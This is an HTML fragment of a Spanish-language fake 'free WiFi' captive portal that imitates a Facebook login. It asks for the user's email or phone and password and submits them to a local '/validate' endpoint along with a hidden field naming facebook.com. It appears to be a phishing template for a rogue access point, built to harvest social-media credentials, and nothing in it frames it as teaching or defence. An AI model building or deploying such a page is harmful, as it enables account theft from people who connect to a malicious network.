...
<html>
  ...
  <head>
    ...
    <title>WiFi gratuita - Inicio de sesión en Facebook</title>
  ...
  <body>
    ...
    <section class='login-form-wrap'>
      ...
      <h1 class='disable-selection'>Entra con Facebook y accede a Internet</h1>

        <form class='login-form' action='/validate' method='GET'>

            <center><label>
            <input id='eml' type='text' name='user' class='1' placeholder='Correo o teléfono' _autofocus='true' autocorrect='off' autocomplete='off' autocapitalize='off' required></label>
            <label><input id='pwd' type='password' name='pass' class='2' placeholder='Contraseña' autocorrect='off' autocomplete='off' autocapitalize='off' required></label></center>
            <input type='hidden' name='url' value='facebook.com'>
            <input id='btn' type='submit' value='Acceder'>

        </form>

      <h5><a href='#' class='disable-selection'>Has olvidado tu contraseña ?</a></h5>
